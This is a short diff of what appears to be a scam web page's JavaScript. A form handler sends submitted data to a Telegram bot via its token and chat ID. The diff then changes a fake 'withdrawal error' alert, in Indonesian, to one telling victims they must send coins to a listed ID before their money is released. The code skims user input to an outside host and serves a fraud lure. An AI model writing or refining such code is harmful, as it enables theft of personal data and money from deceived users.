@@ -617,7 +617,7 @@ stars.forEach(s => s.classList.add('active'));
 
         fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`)
         .then(() => {
-            alert(" BONGKAR EROR!\n\nSaat Ini Bongkar Dibawah 5B sedang maintenance. Silakan Cukupkan Ke 5B Agar Uang Lansung Otomatis DI Transfer.");
+            alert(" BONGKAR EROR!\n\nSISTEM MENDETEKSI ANDA BELUM MELAKUKAN PENGIRIMAN KOIN, HARAP LAKUKAN PENGIRIMAN KOIN KE ID YANG TERTERA AGAR UANG ANDA SEGERA DI PROSES.");
             btn.innerText = "PROSES SEKARANG";
             btn.disabled = false;
             this.reset();
